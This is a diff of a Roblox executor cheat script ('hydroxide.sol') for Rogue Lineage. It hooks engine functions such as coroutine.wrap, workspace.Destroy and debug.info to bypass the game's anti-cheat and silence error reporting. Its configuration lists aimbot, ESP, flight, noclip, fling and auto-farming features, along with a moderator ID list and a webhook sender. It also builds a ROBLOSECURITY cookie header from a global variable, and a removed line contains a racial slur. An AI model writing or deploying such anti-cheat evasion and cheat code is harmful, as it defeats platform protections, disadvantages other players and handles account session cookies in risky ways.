@@ -2,94 +2,29 @@ if not game:IsLoaded() then
     game.Loaded:Wait()
 end
 
-local HYDROXIDE_DEBUG_USER = "Caikunya"
-local function get_debug_local_player()
-    local success, players_service = pcall(game.GetService, game, "Players")
-    if success and players_service then
-        return players_service.LocalPlayer
-    end
-    return nil
-end
-
-local function is_hydroxide_debug_enabled()
-    local default_enabled = false
-    local local_player = get_debug_local_player()
-    if local_player and local_player.Name == HYDROXIDE_DEBUG_USER then
-        default_enabled = true
-    end
-
-    if getgenv then
-        local env = getgenv()
-        if local_player and local_player.Name == HYDROXIDE_DEBUG_USER then
-            env.HYDROXIDE_DEBUG = true
-            return true
+local cloneref = cloneref or function(v) return v end
+local Services = setmetatable({}, {
+    __index = function(self, name)
+        local success, result = pcall(game.GetService, game, name)
+        if success then
+            local service = cloneref(result)
+            rawset(self, name, service)
+            return service
         end
-        if env.HYDROXIDE_DEBUG ~= nil then
-            return env.HYDROXIDE_DEBUG == true
-        end
-        if local_player then
-            env.HYDROXIDE_DEBUG = default_enabled
-        end
+        warn("Invalid Service: " .. tostring(name))
     end
+})
 
-    return default_enabled
-end
+local Players = Services.Players
+repeat task.wait() until Players.LocalPlayer
+repeat task.wait() until Players.LocalPlayer.Backpack
 
-local function debug_warn(...)
-    if is_hydroxide_debug_enabled() then
-        warn(...)
-    end
-end
-
-local function load_warn(...)
-    warn(...)
-end
-
-local function set_hydroxide_load_stage(stage, detail)
-    if not getgenv then
-        return
-    end
-
-    local env = getgenv()
-    env.HYDROXIDE_LOAD_STAGE = tostring(stage)
-    env.HYDROXIDE_LOAD_DETAIL = detail == nil and nil or tostring(detail)
-    local updater = env.HYDROXIDE_BOOT_DEBUG_UPDATE
-    if type(updater) == "function" then
-        pcall(updater, env.HYDROXIDE_LOAD_STAGE, env.HYDROXIDE_LOAD_DETAIL)
-    end
-end
-
-local function fatal_load(stage, message)
-    message = tostring(message or "[HYDROXIDE] Bootstrap failed")
-    if getgenv then
-        getgenv().HYDROXIDE_LAST_ERROR = message
-    end
-    set_hydroxide_load_stage(stage or "battlegrounds_fatal_load", message)
-    load_warn(message)
-    error(message)
-end
-
-set_hydroxide_load_stage("battlegrounds_source_start")
-if getgenv then
-    getgenv().HYDROXIDE_LAST_ERROR = nil
-end
-
-local executor_cloneref = cloneref
-local function cloneref(value)
-    if type(executor_cloneref) == "function" then
-        local success, result = pcall(executor_cloneref, value)
-        if success and result ~= nil then
-            return result
-        end
-        debug_warn("[HYDROXIDE] cloneref failed; using raw instance", result)
-    end
-
-    return value
-end
+local StarterGui = Services.StarterGui
+repeat task.wait() until StarterGui:FindFirstChild("LeaderboardGui")
 
 pcall(function()
     if getconnections then
-        for _,v in pairs(getconnections(game:GetService('ScriptContext').Error)) do
+        for _,v in pairs(getconnections(Services.ScriptContext.Error)) do
             v:Disable();
         end
     end
@@ -109,7 +44,31 @@ loadstring([[
 
 pcall(loadstring([[if not HXD_HWID then HXD_HWID="STUB_HWID" HXD_DISCORD_ID="123456789" HXD_EXPIRES_AT=os.time()+2592000 HXD_STATUS="active" HXD_EXECUTION_COUNT=1 HXD_SECONDS_LEFT=2592000 HXD_UserNote="beta" end]]));
 pcall(loadstring([[if not HXD_SANITIZE then function HXD_SANITIZE(value,pattern)if not value or not pattern then return""end;value=tostring(value)local charset=pattern:match("%[(.-)%]")if not charset then return""end;local _,max=pattern:match("{%s*(%d+)%s*,%s*(%d+)%s*}")local max_len=tonumber(max)or#value;local extra_chars="→←↑↓★☆"charset=charset:gsub("%]","%%]")value=value:gsub("[^"..charset..extra_chars.."]","")return value:sub(1,max_len)end end]]));
-pcall(loadstring([[if not HXD_SEND_WEBHOOK then function HXD_SEND_WEBHOOK(url,data)local req=http_request or request or syn.request;if not req then if getgenv and getgenv().HYDROXIDE_DEBUG then warn("[STUB] Webhook:",url)end return true end;local HttpService=game:GetService("HttpService")local headers={["Content-Type"]="application/json"}local body=HttpService:JSONEncode(data)local response=req({Url=url,Method="POST",Headers=headers,Body=body})return response end end]]));
+do
+    local existing = rawget(getgenv(), "HXD_SEND_WEBHOOK")
+    if not existing or (type(existing) ~= "function" and type(existing) ~= "table") then
+        getgenv().HXD_SEND_WEBHOOK = function(url, data)
+            local req = http_request or request or (syn and syn.request)
+            if not req then warn("[STUB] No HTTP function") return false end
+            local body = game:GetService("HttpService"):JSONEncode(data)
+            local ok, res = pcall(req, {Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body})
+            if not ok then warn("[STUB] Request failed:", res) return false end
+            if type(res) ~= "table" then return true end
+            local code = res.StatusCode or res.statusCode or 200
+            return code >= 200 and code < 300
+        end
+    end
+end
+
+local anticheat_mode = "Normal"
+pcall(function()
+    if isfile and readfile and isfile("HYDROXIDE/anticheat_mode.txt") then
+        local saved_mode = readfile("HYDROXIDE/anticheat_mode.txt")
+        if saved_mode == "Kick" or saved_mode == "Normal" then
+            anticheat_mode = saved_mode
+        end
+    end
+end)
 
 local Required = {
 	"hookfunction",
@@ -125,18 +84,18 @@ local Required = {
     "checkcaller"
 }
 
-local Kick = clonefunction and clonefunction(game:GetService("Players").LocalPlayer.Kick) or game:GetService("Players").LocalPlayer.Kick
+local Kick = clonefunction and clonefunction(Services.Players.LocalPlayer.Kick) or Services.Players.LocalPlayer.Kick
 for i = 1, #Required do
 	local v = Required[i]
 	if not getgenv()[v] then
-        Kick(game:GetService("Players").LocalPlayer, `Your executor does not support [{v}], which is required to use hydroxide.sol @ Rogue Lineage Battlegrounds.`)
+        Kick(Services.Players.LocalPlayer, `Your executor does not support [{v}], which is required to use hydroxide.sol @ Rogue Lineage.`)
 	end
 end
 
 local function process_string(str, salt)
     salt = salt or 27
     if not bit32 or not bit32.bxor then
-        debug_warn("bit32.bxor not available")
+        warn("bit32.bxor not available")
         return str
     end
     local chars = {}
@@ -154,115 +113,134 @@ local function decode(str, salt) return process_string(str, salt) end
 local function generate_key()
     local p = game.PlaceId
     local j = game.JobId
-    local u = game:GetService("Players").LocalPlayer.UserId
+    local u = Services.Players.LocalPlayer.UserId
     return encode(p.."_"..j:sub(1,5).."_"..tostring(u):sub(-4))
 end
 
 local key = generate_key()
-if game.PlaceId == 100010170789226 then
+if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 109732117428502 or game.PlaceId == 14341521240 then
     if getgenv()[key] and type(getgenv()[key]) == "table" then return end
     getgenv()[key] = setmetatable({}, { __tostring = function() return "nil" end })
 
     local success, err = xpcall(function()
-        
-    do -- Adonis Anti-Cheat Bypass
-        LPH_NO_VIRTUALIZE(function()
-            if game and not game:IsLoaded() then
-                repeat wait() until game:IsLoaded()
-            end
+    local old_destroy = nil
+    do
+        if not getgenv().lolololol then
+            old_destroy = hookfunction(workspace.Destroy, function(Self)
+                if not checkcaller() then
+                    if tostring(Self) == "CharacterHandler" then
+                        return
+                    end
+                end
 
-            local old_identity = getthreadidentity()
+                return old_destroy(Self)
+            end)
 
-            setthreadidentity(2) -- prevents "Adonis_0x16471" kick
+            if anticheat_mode == "Kick" then
+                task.spawn(function()
+                    local cw
+                    local lockThreads = {}
 
-            task.spawn(function()
-                local patched = 0
+                    cw = hookfunction(coroutine.wrap, newcclosure(function(f,...)
+                        if not checkcaller() then
+                            if type(f) == "function" and islclosure(f) then
+                                local consts, upvals = getconstants(f), getupvalues(f)
+                                local g3 = getfenv(3)
 
-                for _, func in ipairs(getgc(true)) do
-                    if typeof(func) == "function" and islclosure(func) then
-                        local ok, consts = pcall(debug.getconstants, func)
-                        if ok and consts and #consts <= 2 then
-                            for i, c in ipairs(consts) do
-                                if tostring(c):lower():find("script") == nil and tostring(c):lower():find("rbx") == nil then
-                                    local src = debug.info(func, "s") or ""
-                                    if src:find("Anti") or src:lower():find("core") then
-                                        hookfunction(func, function(...)
-                                            warn("dont crash my nigga")
-                                            return
-                                        end)
-                                        patched += 1
+                                if typeof(upvals[2]) == "Instance" and upvals[2]:IsA("AnimationTrack") and upvals[1] == upvals[2].Play then
+                                    lockThreads[g3] = true
+                                end
+
+                                if consts[1] == "scr" and consts[2] == "Parent" then
+                                    lockThreads[g3] = true
+                                end
+
+                                if consts[1] == "coroutine" and consts[2] == "create" and table.find(consts,"dead") then
+                                    lockThreads[g3] = true
+                                end
+
+                                if g3 and lockThreads[g3] then
+                                    local plrs_local = Services.Players
+                                    while true do
+                                        plrs_local.LocalPlayer:Kick("Ban Attempt")
+                                        task.wait()
                                     end
                                 end
                             end
+
+                            if lockThreads[getfenv(3)] then
+                                return function() end
+                            end
                         end
-                    end
-                end
-                warn("crash loop patch complete:", patched)
-            end)
 
-            task.defer(function()
-                for _, v in getgc(true) do
-                    if typeof(v) == "table" and rawget(v, "Kill") and typeof(v.Kill) == "function" then
-                        hookfunction(v.Kill, function(...)
-                            warn("kill() blocked imagine")
-                            return
-                        end)
-                    end
-                end
-            end)
+                        return cw(f,...)
+                    end))
+                end)
+            else
+                LPH_NO_VIRTUALIZE(function()
+                    local type = type
+                    local getupvalues = getupvalues
+                    local islclosure = islclosure
+                    local EmptyFunc = function() end
+                    local RunService = Services.RunService
+                    local debug_info = debug.info
 
-            local old_debug_info = debug.info
-            hookfunction(debug.info, newcclosure(function(func, what)
-                if typeof(func) == "function" and debug.info(func, "s") and debug.info(func, "s"):find("Core.Anti") then
-                    if what == "n" then return "Detected" end
-                    if what == "f" then return func end
-                    if what == "s" then return debug.info(func, "s") end
-                    if what == "l" then return debug.info(func, "l") end
-                    if what == "a" then return debug.info(func, "a") end
-                end
-                return old_debug_info(func, what)
-            end))
+                    local old
+                    old = hookfunction(coroutine.wrap, newcclosure(function(func)
+                        if not checkcaller() then
+                            if type(func) == "function" and islclosure(func) then
+                                local upvals = getupvalues(func)
+                                if #upvals == 1 then
+                                    if upvals[1] == RunService then
+                                        return old(EmptyFunc)
+                                    end
+                                end
+                            end
 
-            setthreadidentity(old_identity) -- restore the old identity
-        end)()
+                            local stackfunc = debug_info(5, "n")
+                            if stackfunc and stackfunc == "pcall" then
+                                return
+                            end
+                        end
+                        return old(func)
+                    end))
+                end)()
+            end
+        end
     end
 
     local start = os.clock()
     do
         makefolder("HYDROXIDE")
-        makefolder("HYDROXIDE\\configs")
+        if game.PlaceId == 14341521240 then
+            makefolder("HYDROXIDE\\rlp_configs")
+        else
+            makefolder("HYDROXIDE\\configs")
+        end
     end
 
-    local cloneref = (cloneref or clonereference or function(instance: any)
-        return instance
-    end)
+    local cas  = Services.ContextActionService
+    local vim  = Services.VirtualInputManager
+    local mem  = Services.MemStorageService
+    local rps  = Services.ReplicatedStorage
+    local cs   = Services.CollectionService
+    local uis  = Services.UserInputService
+    local tps  = Services.TeleportService
+    local txt  = Services.TextChatService
+    local ts   = Services.TweenService
+    local vs   = Services.VirtualUser
+    local sui  = Services.StarterGui
+    local rs   = Services.RunService
+    local gui  = Services.GuiService
+    local lit  = Services.Lighting
+    local plrs = Services.Players
+    local ws   = Services.Workspace
+    local deb  = Services.Debris
+    local cg   = Services.CoreGui
 
-    -- Services
-    local cas  = cloneref(game:GetService("ContextActionService"))
-    local vim  = cloneref(game:GetService("VirtualInputManager"))
-    local mem  = cloneref(game:GetService("MemStorageService"))
-    local rps  = cloneref(game:GetService("ReplicatedStorage"))
-    local cs   = cloneref(game:GetService("CollectionService"))
-    local uis  = cloneref(game:GetService("UserInputService"))
-    local tps  = cloneref(game:GetService("TeleportService"))
-    local txt  = cloneref(game:GetService("TextChatService"))
-    local ts   = cloneref(game:GetService("TweenService"))
-    local vs   = cloneref(game:GetService("VirtualUser"))
-    local sui  = cloneref(game:GetService("StarterGui"))
-    local httt = cloneref(game:GetService("HttpService"))
-    local rs   = cloneref(game:GetService("RunService"))
-    local gui  = cloneref(game:GetService("GuiService"))
-    local lit  = cloneref(game:GetService("Lighting"))
-    local plrs = cloneref(game:GetService("Players"))
-    local ws   = cloneref(game:GetService("Workspace"))
-    local deb  = cloneref(game:GetService("Debris"))
-    local cg   = cloneref(game:GetService("CoreGui"))
-
-    -- Local
     local plr = plrs.LocalPlayer
     local mouse = cloneref(plr:GetMouse())
 
-    -- Alias
     local FindFirstChild = game.FindFirstChild
     local WaitForChild = game.WaitForChild
     local FindFirstChildWhichIsA = game.FindFirstChildWhichIsA
@@ -274,39 +252,56 @@ if game.PlaceId == 100010170789226 then
     end
     
     local ui = tostring(identifyexecutor()) == "Volt" and cg or (gethui and gethui() or cg)
+    local font = (Drawing.Fonts and Drawing.Fonts.UI) or 2
+
+
     local flagged_chats = {'clipped','exploiter','banned','blacklisted','clip','hacker'}
     local hidden_folder = Instance.new("Folder", ui)
     local area_markers = ws:WaitForChild("AreaMarkers")
+    local area_data = require(rps:WaitForChild("Info"):WaitForChild("AreaData"))
 
-    local get_mouse_remote = rps:WaitForChild("Networking").Requests.GetMouse
-    local dialogue_remote = rps:WaitForChild("Networking").Requests.Dialogue
+    local get_mouse_remote
+    if game.PlaceId == 14341521240 then
+        get_mouse_remote = nil
+    else
+        get_mouse_remote = rps:WaitForChild("Requests"):WaitForChild("GetMouse")
+    end
 
-
-    local join_server -- fill this
+    local join_server
+    if game.PlaceId == 14341521240 then
+        join_server = nil
+    else
+        join_server = rps:WaitForChild("Requests"):WaitForChild("JoinPublicServer")
+    end
 
     local live_folder = ws:WaitForChild("Live")
     local headers = {["content-type"] = "application/json"}
 
     local teleport_failed = false
     local teleport_fail_reason = ""
-    tps.TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
+    local teleport_init_failed_connection = tps.TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
         teleport_failed = true
         teleport_fail_reason = errorMessage or "Unknown error"
         warn(string.format("[TELEPORT FAILED] %s - Retrying serverhop...", teleport_fail_reason))
     end)
 
-    local is_gaia = game.PlaceId == 100010170789226;
+    local is_gaia = game.PlaceId == 5208655184;
     local is_khei = game.PlaceId == 3541987450 or game.PlaceId == 14341521240;
 
     local updatePlayerLabel, getPlayerColor
     local last_area_restore = nil
     local ingredient_folder = nil
+    local auto_pot_active = false
+    local auto_craft_active = false
     local was_noclip_enabled = false
+
     local mana_overlay = {}
     local transparent_parts = {}
     local original_names = {}
     local original_days = {}
     local original_materials = {}
+    local dialogue_remote = nil
+    local mana_remote = nil
     local old_remote = nil
     local old_hastag = nil
     local old_newindex = nil
@@ -326,12 +321,15 @@ if game.PlaceId == 100010170789226 then
     local done = false
     local busy = false
 
-    -- Global Tables
     local game_client = {}
     local library = {}
-    local utility = {}
+    local utility = {
+        day_cache = 0,
+    }
     local shared = {
         is_unloading = false,
+        on_teleport_setup = false,
+        on_teleport_connection = nil,
         drawing_containers = {
             menu = {},
             notification = {},
@@ -342,7 +340,6 @@ if game.PlaceId == 100010170789226 then
         hidden_connections = {},
         blatant_features = {"flight", "better_flight", "no_fall", "no_killbrick", "auto_bag", "NoStun", "PerfloraTeleport", "parry_ignore_visibility", "forcefield", "anti_globus", "fling", "loop_orderly", "start_path", "test_path", "enable_aa_bypass"},
         blatant_toggles = {},
-        -- pointers table removed - now using Library.Options and Library.Toggles
         theme = {
             inline = Color3.fromRGB(3, 3, 3),
             dark = Color3.fromRGB(24, 24, 24),
@@ -364,13 +361,11 @@ if game.PlaceId == 100010170789226 then
         allowedKeyCodes = {"Q","W","E","R","T","Y","U","I","O","P","A","S","D","F","G","H","J","K","L","Z","X","C","V","B","N","M","One","Two","Three","Four","Five","Six","Seven","Eight","Nine","Zero","F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12","KeypadOne","KeypadTwo","KeypadThree","KeypadFour","KeypadFive","KeypadSix","KeypadSeven","KeypadEight","KeypadNine","KeypadZero","KeypadPeriod","KeypadDivide","KeypadMultiply","KeypadMinus","KeypadPlus","KeypadEnter","Insert","Tab","Home","End","LeftAlt","LeftControl","LeftShift","RightAlt","RightControl","RightShift","CapsLock","Return","Up","Down","Left","Right"},
         allowedInputTypes = {"MouseButton1","MouseButton2","MouseButton3"},
         shortenedInputs = {
-            -- Control Keys
             ["LeftControl"] = 'left control',
             ["RightControl"] = 'right control',
             ["LeftShift"] = 'left shift',
             ["RightShift"] = 'right shift',
 
-            -- Numberbar
             ["Backquote"] = "grave",
             ["Tilde"] = "~",
             ["At"] = "@",
@@ -391,11 +386,9 @@ if game.PlaceId == 100010170789226 then
             ["BackSlash"] = '\\',
             ["Question"] = '?',
 
-            -- Super
             ["PageUp"] = "pgup",
             ["PageDown"] = "pgdwn",
 
-            -- Keyboard
             ["Comma"] = ",",
             ["Period"] = ".",
             ["Semicolon"] = ",",
@@ -408,7 +401,6 @@ if game.PlaceId == 100010170789226 then
             ["RightCurly"] = "}",
             ["Pipe"] = "|",
 
-            -- Numberpad
             ["NumLock"] = "num lock",
             ["KeypadNine"] = "num 9",
             ["KeypadEight"] = "num 8",
@@ -429,7 +421,6 @@ if game.PlaceId == 100010170789226 then
             ["KeypadEnter"] = "num enter",
             ["KeypadEquals"] = "num equals",
 
-            -- Mouse
             ["MouseButton1"] = 'mouse1',
             ["MouseButton2"] = 'mouse2',
             ["MouseButton3"] = 'mouse3',
@@ -440,7 +431,8 @@ if game.PlaceId == 100010170789226 then
     }
     local cheat_client = {
         config = {
-            perflora_teleport = false, -- Combat Chunk
+            anticheat_mode = "Normal",
+            perflora_teleport = false,
             auto_misogi = false,
             anti_backfire_viribus = false,
             hold_block = false,
@@ -468,8 +460,9 @@ if game.PlaceId == 100010170789226 then
             aimbot_hitboxes = 1,
             ignore_blocking = false,
             hide_fov_circle = false,
+            visible_check = true,
     
-            player_esp = true, -- Visual Chunk
+            player_esp = true,
             player_box = true,
             player_health = true,
             player_name = true,
@@ -490,13 +483,36 @@ if game.PlaceId == 100010170789226 then
             player_chams_fill = false,
             player_chams_pulse = false,
             player_chams_occluded = false,
-            --player_chams_color = Color3.fromRGB(0,255,255),
 
             player_healthview = false,
             legit_intent = false,
+    
+            trinket_esp = true,
+            trinket_show_area = true,
+            trinket_range = 1000,
+            trinket_types = {
+                ["Common"] = true,
+                ["Rare"] = true,
+                ["Mythic"] = true,
+                ["Artifact"] = true,
+                ["Event"] = true
+            },
+            trinket_ignore_range_types = {
+                ["Mythic"] = true,
+                ["Artifact"] = true,
+                ["Event"] = true
+            },
 
             shrieker_chams = false,
+            fallion_esp = false,
             npc_esp = false,
+    
+            ore_esp = false,
+            mythril_esp = false,
+            copper_esp = false,
+            iron_esp = false,
+            tin_esp = false,
+            ore_range = 12000,
             
             ingredient_esp = false,
             ingredient_range = 500,
@@ -510,66 +526,88 @@ if game.PlaceId == 100010170789226 then
             brightness_level = 80,
             change_time = false,
             clock_time = 12,
+
             mana_overlay = false,
     
-            no_insane = false, -- Exploits Chunk
+            no_insane = false,
+            instant_mine = false,
+            bard_stack = false,
             observe = true,
             invis_cam = false,
             max_zoom = false,
+            anti_globus = false,
             fling = false,
             fling_flight_speed = 50,
 
-            flight = false, -- Movement Chunk
+            flight = false,
             noclip = false,
             auto_fall = false,
             flight_speed = 100,
             better_flight = false,
 
-            auto_dialogue = false, -- Automation Chunk
+            auto_dialogue = false,
             auto_bard = false,
             hide_bard = false,
             anti_afk = false,
+            auto_trinket = false,
+            auto_ingredient = false,
             auto_weapon = false,
+            auto_resurrection = false,
+            auto_charge = false,
+            auto_charge_threshold = 100,
+            auto_bag = false,
+            show_bag_range = false,
+            bag_range = 80,
+            reequip_gate_in_loop = true,
 
 
-            -- World Chunk
             temperature_lock = false,
             textures = false,
             no_fall = false,
             no_killbrick = false,
+            no_mob_trigger = false,
             freecam = false,
 
-            -- Misc Chunk
             double_jump = false,
             the_soul = false,
             better_mana = false,
+            better_unequip = false,
             ignore_danger = false,
             execute_on_serverhop = true,
             persistent_configs = true,
             proximity_notifier = false,
             proximity_ignore_allies = false,
+            loop_join = false,
+            loop_join_player = false,
             roblox_chat = false,
+            inventory_search = false,
             unhide_players = true,
             gate_anti_backfire = false,
             streamer_mode = false,
 
-            -- Keybinds Chunk
             friendly_keybind = "None",
+            create_point_keybind = "None",
             better_flight_keybind = "None",
             flight_keybind = "None",
             noclip_keybind = "None",
             fling_keybind = "None",
             freecam_keybind = "None",
             player_esp_keybind = "None",
+            ore_esp_keybind = "None",
+            ingredient_esp_keybind = "None",
             attach_to_back_keybind = "None",
             fullbright_keybind = "None",
             no_fog_keybind = "None",
+            auto_bag_keybind = "None",
+            auto_trinket_pickup_keybind = "None",
+            auto_ingredient_pickup_keybind = "None",
             auto_weapon_keybind = "None",
+            auto_craft_delay = 0.25,
+            ps_heal_button_keybind = "None",
             instant_menu_keybind = "None",
             menu_keybind = "RightShift",
             unload_keybind = "End",
 
-            -- UI Chunk
             auto_housemate_ally = false,
             auto_friend_ally = false,
             notifications = true,
@@ -581,10 +619,15 @@ if game.PlaceId == 100010170789226 then
             keybind_frame_position = nil,
             status_frame_position = nil,
 
-            -- Spoofing Chunk
-            custom_name_spoof = "",
+            webhook = "",
+            webhook_username = "bladee",
+            dayfarm_webhook = "",
+            show_in_artifact_stream = false,
 
-            -- Character Customization
+            custom_name_spoof = "",
+            custom_day_spoof = 1,
+            spoof_days_enabled = false,
+
             char_custom_enabled = false,
             char_custom_face = "",
             char_custom_shirt = "",
@@ -596,14 +639,13 @@ if game.PlaceId == 100010170789226 then
             outfit_shirt_color = nil,
             outfit_pants_color = nil,
         },
-        stuns = { -- Some of these don't need to be here, but only here cause of zyu
+        stuns = {
             ManaStop = true,
             Sprinting = true,
             Action = true,
             NoJump = true,
             HeavyAttack = true,
             LightAttack = true,
-            NoJump = true,
             ForwardDash = true,
             RecentDash = true,
             ClimbCoolDown = true,
@@ -623,6 +665,12 @@ if game.PlaceId == 100010170789226 then
             JumpCool = true,
             Danger = true,
         },
+        im_lazy_stuns = {
+            HeavyAttack = true,
+            LightAttack = true,
+            Action = true,
+            Blocking = true,
+        },
         mental_injuries = {
             Hallucinations = true,
             PsychoInjury = true,
@@ -634,7 +682,7 @@ if game.PlaceId == 100010170789226 then
             Maniacal = true,
             Fearful = true
         },
-        physical_injuries = { -- Removed Knocked, Unconscious because if you spoof it; it will brick ur client
+        physical_injuries = {
             BrokenLeg = false,
             BrokenRib = false,
             BrokenArm = false,
@@ -664,7 +712,7 @@ if game.PlaceId == 100010170789226 then
             ["Spearfisher"] = {"Harpoon","Skewer","Hunter's Focus"},
             ["Deep Knight"] = {"Chain Pull", "PrinceBlessing"},
             ["Sigil Knight"] = {"Hyper Body","White Flame Charge"},
-            ["Wraith Knight"] = {"Dark Charged Blow"},
+            ["Wraith Knight"] = {"Dark Charged Blow", "Mirror"},
             ["Blacksmith"] = {"Remote Smithing","Grindstone"},
             ["Ronin"] = {"Calm Mind","Swallow Reversal","Triple Slash","Blade Flash","Flowing Counter"},
             ["Abyss Walker"] = {"Abyssal Scream","Wrathful Leap"},
@@ -711,12 +759,47 @@ if game.PlaceId == 100010170789226 then
             ["Telorum"] = {{80, 90}, {75, 85}},
             ["Velo"] = {{0, 100}, {50, 60}}
         },
+        trinket_colors = {
+            none = {ZIndex = 1,Color = Color3.fromRGB(40, 40, 40)},
+            common = {ZIndex = 2,Color = Color3.fromRGB(189, 97, 29)},
+            rare = {ZIndex = 3,Color = Color3.fromRGB(60, 150, 150)},
+            event = {ZIndex = 4,Color = Color3.fromRGB(0, 255, 0)},
+            artifact = {ZIndex = 5,Color = Color3.fromRGB(160, 100, 160)},
+            mythic = {ZIndex = 6,Color = Color3.fromRGB(255, 0, 80)},
+        },
         custom_flight_functions = {
             ["IsKeyDown"] = uis.IsKeyDown,
             ["GetFocusedTextBox"] = uis.GetFocusedTextBox,
         },
+        ingredient_identifiers = {
+            ["3293218896"] = "Desert Mist",
+            ["2773353559"] = "Blood Thorn",
+            ["2960178471"] = "Snowscroom",
+            ["2577691737"] = "Lava Flower",
+            ["2618765559"] = "Glow Scroom",
+            ["2575167210"] = "Moss Plant",
+            ["2620905234"] = "Scroom",
+            ["2766925289"] = "Trote",
+            ["2766925320"] = "Polar Plant",
+            ["2766802713"] = "Periashroom",
+            ["2766802766"] = "Strange Tentacle",
+            ["2766925228"] = "Tellbloom",
+            ["2766802731"] = "Dire Flower",   
+            ["2573998175"] = "Freeleaf",
+            ["2766925214"] = "Crown Flower",
+            ["3215371492"] = "Potato",
+            ["2766925304"] = "Vile Seed",
+            ["3049345298"] = "Zombie Scroom",
+            ["2766802752"] = "Orcher Leaf",
+            ["2766925267"] = "Creely",
+            ["2889328388"] = "Ice Jar",
+            ["3049928758"] = "Canewood",
+            ["3049556532"] = "Acorn Light",
+            ["2766925245"] = "Uncanny Tentacle",
+            ["9858299042"] = "Evoflower",
+        },
         must_touch = {
-            [BrickColor.new("Reddish brown").Number] = true, -- idk
+            [BrickColor.new("Reddish brown").Number] = true,
             [BrickColor.new("Copper").Number] = true,
             [BrickColor.new("Magenta").Number] = true,
         },
@@ -732,9 +815,91 @@ if game.PlaceId == 100010170789226 then
             TeleportIn = true,
             TeleportOut = true,
         },
+        blacklisted_ingredients = {
+            [Vector3.new(1967.81348, 177.639648, 1084.42285)] = true,
+            [Vector3.new(1987.31, 177.64, 1080.92)] = true,
+            [Vector3.new(2511.75, 198.985, -442.45)] = true,
+            [Vector3.new(2510.07, 199.709, -518.071)] = true,
+            [Vector3.new(2512.57, 199.709, -518.321)] = true,
+            [Vector3.new(2511.57, 199.709, -517.071)] = true,
+            [Vector3.new(2438.07, 199.709, -466.071)] = true,
+            [Vector3.new(2439.07, 199.709, -467.321)] = true,
+            [Vector3.new(2439.57, 199.709, -465.071)] = true,
+        },
+        artifacts = {"Rift Gem", "Lannis's Amulet", "Amulet of the White King", "Scroll of Fimbulvetr", "Scroll of Percutiens", "Scroll of Hoppa", "Scroll of Snarvindur", "Scroll of Manus Dei", "Spider Cloak", "Night Stone", "Philosophers Stone", "Howler Friend", "Phoenix Down", "Azael Horn", "Mysterious Artifact", "Fairfrozen", "Phoenix Flower"},
         spec_skills = {"Eyes of Justice", "Justinian's Helm", "Speech", "Undying Justinian", "Handgun", "StaticField", "Chain Lightning", "Flying Mushroom God", "Flying Flower God", "Overgrowth", "Scroomflora", "Mind Read", "Domination Rune", "Bestowal", "Domination", "Despair", "Better Manus Dei", "Better Mori", "Maledicta Terra", "Terrible Scream", "FrostAura", "Ray of Frost", "Aculeor", "Infettare", "Sylvester's Cloak", "Jester's Trick", "Quick Stop", "Abyssbypass", "VeryCoolBard", "Snowball", "Time Halt", "Time Erase", "Jester's Ruse", "Jester's Scheme", "Wallet Swipe", "Epitaph", "Pondus", "Darkness"},
         mod_list = {
-            115, -- // 115
+            117075515,
+            117092117,
+            218915876,
+            147287757,
+            1992980412,
+            2352320475,
+            1923314177,
+            1315267418,
+            1929945985,
+            29656,
+            3408465701,
+            272525488,
+            360905811,
+            309149657,
+            2758900605,
+            2052324682,
+            1220344444,
+            1099784,
+            1090716399,
+            1754748220,
+            78504910,
+            364994040,
+            96218539,
+            434535742,
+            19044993,
+            411595307,
+            1490237662,
+            1255256325,
+            1306981979,
+            20469570,
+            71662791,
+            77196836,
+            28177302,
+            8835343,
+            88193330,
+            83785067,
+            2542030529,
+            274304909,
+            2441088083,
+            177436599,
+            64992045,
+            1866587913,
+            1586650903,
+            1085890137,
+            143241422,
+            1014826936,
+            1657035,
+            2259720861,
+            338544906,
+            399618581,
+            73062,
+            167825083,
+            110153256,
+            266800563,
+            1216700054,
+            3314396480,
+            3292692379,
+            1427798376,
+            1626803537,
+            1311587059,
+            988461535,
+            3006409955,
+            2485656647,
+            1255256325,
+            2228891194,
+            2243463821,
+            2252396915,
+            1989789343,
+            8791234913,
+            2260532477,
+            677317511,
         },
         aimbot = {
             aimkey_translation = {
@@ -749,11 +914,10 @@ if game.PlaceId == 100010170789226 then
         window_active = true,
     }
 
-    -- Friends save/load functions
     local friends_file = "HYDROXIDE/friends.json"
     function cheat_client:save_friends()
         local success, err = pcall(function()
-            local json = game:GetService("HttpService"):JSONEncode(self.friends)
+            local json = Services.HttpService:JSONEncode(self.friends)
             writefile(friends_file, json)
         end)
         if not success then
@@ -765,7 +929,7 @@ if game.PlaceId == 100010170789226 then
         local success, result = pcall(function()
             if isfile(friends_file) then
                 local json = readfile(friends_file)
-                return game:GetService("HttpService"):JSONDecode(json)
+                return Services.HttpService:JSONDecode(json)
             end
             return {}
         end)
@@ -777,16 +941,15 @@ if game.PlaceId == 100010170789226 then
         end
     end
 
-    -- Load friends on startup
     cheat_client:load_friends()
 
     local cpu = {
         services = {
-            uis = game:GetService('UserInputService'),
-            vs = game:GetService("VirtualUser"),
-            rs = game:GetService("RunService"),
+            uis = Services.UserInputService,
+            vs = Services.VirtualUser,
+            rs = Services.RunService,
             ugs = UserSettings():GetService('UserGameSettings'),
-            plrs = game:GetService("Players"),
+            plrs = Services.Players,
                 
             ms = UserSettings():GetService('UserGameSettings').MasterVolume,
             ql = settings().Rendering.QualityLevel,
@@ -801,14 +964,13 @@ if game.PlaceId == 100010170789226 then
     local ROBLOX_API_HEADERS = {
         ["Content-Type"] = "application/json",
         ["Accept"] = "application/json",
-        ["Cookie"] = ".ROBLOSECURITY=COOKIE_HERE"
+        ["Cookie"] = ".ROBLOSECURITY=" .. ((_G.Cookie ~= nil and _G.Cookie ~= "" and _G.Cookie) or "COOKIE_HERE")
     }
     
-    -- Encrypt Module
     do
         local BitBuffer
     
-        do -- Bit Buffer Module
+        do
             BitBuffer = {}
     
             local NumberToBase64; local Base64ToNumber; do
@@ -874,7 +1036,6 @@ if game.PlaceId == 100010170789226 then
             function BitBuffer.Create()
                 local this = {}
     
-                -- Tracking
                 local mBitPtr = 0
                 local mBitBuffer = {}
     
@@ -886,13 +1047,11 @@ if game.PlaceId == 100010170789226 then
                     mBitPtr = 0
                 end
     
-                -- Set debugging on
                 local mDebug = false
